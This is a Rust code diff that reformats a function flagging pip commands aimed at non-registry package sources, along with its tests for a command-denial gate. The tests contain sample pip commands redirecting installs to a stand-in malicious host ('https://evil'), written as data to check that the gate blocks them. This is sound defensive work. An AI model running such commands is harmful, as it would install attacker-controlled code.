@@ -927,7 +927,9 @@ fn pip_non_registry_shape(line: &str) -> Option<String> {
             .iter()
             .any(|d| *word == *d || word.starts_with(&format!("{d}=")))
         {
-            return Some(format!("pip {word} names or redirects non-registry sources"));
+            return Some(format!(
+                "pip {word} names or redirects non-registry sources"
+            ));
         }
     }
     None
@@ -2179,10 +2181,7 @@ mod tests {
             gate_hard_denies("pip --index-url=https://evil install x").len(),
             1
         );
-        assert_eq!(
-            gate_hard_denies("pip -r reqs.txt install x").len(),
-            1
-        );
+        assert_eq!(gate_hard_denies("pip -r reqs.txt install x").len(), 1);
         assert_eq!(
             gate_hard_denies("pip --extra-index-url https://evil install requests").len(),
             1
